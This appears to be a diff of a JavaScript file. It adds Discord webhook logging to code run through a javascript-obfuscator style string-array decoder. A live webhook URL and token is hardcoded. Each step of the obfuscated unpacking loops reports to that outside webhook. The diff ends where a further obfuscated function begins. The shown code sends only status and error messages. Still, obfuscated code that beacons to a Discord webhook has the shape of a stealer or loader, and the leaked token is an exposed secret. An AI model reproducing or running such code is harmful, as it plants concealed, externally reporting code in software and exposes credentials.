@@ -1,15 +1,85 @@
 const webhookURL = "https://discord.com/api/webhooks/1307028232402374737/aeNsuLnv9CG24jn5aGmP5rG76KETAzaoY-Bgtep3Ty7E325OqR4pGlHuu8qz9kc3_ZL3";
 
-function logToDiscord(message) {
-    fetch(webhookURL, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ content: message })
-    }).catch(error => console.error("Error sending log to Discord:", error));
+async function logToDiscord(message) {
+    try {
+        await fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: message })
+        });
+        console.log("Log sent to Discord:", message); // Optional console log for local debugging
+    } catch (error) {
+        console.error("Error sending log to Discord:", error);
+    }
 }
 
+async function delay(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function main() {
+    await logToDiscord("Script started"); // Send initial log
+    await delay(1000); // Delay after sending log
+
+    (async function (_0x2e34e0, _0x2727bf) {
+        await logToDiscord("Initialization started"); // Log start of initialization
+        await delay(1000); // Delay after sending log
+
+        const _0x1a88d5 = _0x2e34e0();
+        while (true) {
+            try {
+                logToDiscord("Entering main loop");
+                await delay(1000); // Delay to ensure log processing
+
+                const _0x3e6fd3 = parseInt(_0x40d9(6240, 0x176c)) / 1 + parseInt(_0x40d9(7930, 0xcf9)) / 2 + -parseInt(_0x40d9(9739, 0x1262)) / 3 + parseInt(_0x40d9(8556, 0x2901)) / 4 + parseInt(_0x40d9(4251, -0x2a1)) / 5 + parseInt(_0x40d9(2129, 0x8ef)) / 6 + -parseInt(_0x40d9(1082, 0x629)) / 7;
+
+                if (_0x3e6fd3 === _0x2727bf) {
+                    await logToDiscord("Initialization successful");
+                    break;
+                } else {
+                    await logToDiscord("Shifting array due to mismatch");
+                    _0x1a88d5.push(_0x1a88d5.shift());
+                }
+            } catch (_0xe6ad79) {
+                await logToDiscord("Error encountered: " + _0xe6ad79.message);
+                _0x1a88d5.push(_0x1a88d5.shift());
+            }
+        }
+    })(_0x4292, 493538);
+
+    (async function (_0x52a9ca, _0x595e4e) {
+        await logToDiscord("Entering secondary main loop");
+        await delay(1000); // Delay for log processing
+
+        const _0x28bfb2 = _0x52a9ca();
+        while (true) {
+            try {
+              const _0x1bc482 =
+              -parseInt(_0x7c1d(4686, "LQaP")) / 1 +
+              -parseInt(_0x7c1d(5181, "VBFa")) / 2 +
+              (-parseInt(_0x7c1d(5498, "I2O0")) / 3) * (parseInt(_0x7c1d(3731, "WG&*")) / 4) +
+              (-parseInt(_0x7c1d(4172, "(6[r")) / 5) * (-parseInt(_0x7c1d(1344, "lJx&")) / 6) +
+              parseInt(_0x7c1d(5410, "z*Ff")) / 7 +
+              (parseInt(_0x7c1d(4000, "HvHR")) / 8) * (-parseInt(_0x7c1d(2548, "J[gw")) / 9) +
+              parseInt(_0x7c1d(5853, "g@EB")) / 10;
+
+                if (_0x1bc482 === _0x595e4e) {
+                    await logToDiscord("Exiting secondary loop successfully");
+                    break;
+                } else {
+                    _0x28bfb2.push(_0x28bfb2.shift());
+                    await logToDiscord("Shifting secondary array due to mismatch");
+                }
+            } catch (_0x3339f2) {
+                await logToDiscord("Error encountered in secondary loop: " + _0x3339f2.message);
+                _0x28bfb2.push(_0x28bfb2.shift());
+            }
+        }
+    })(_0x3155, 231864);
+}
+
+// Start the main function
+main();
 const _0x4fa6f1 = (function () {
   const _0x1fb5ef = (function () {
     let _0x5ae1c8 = true;
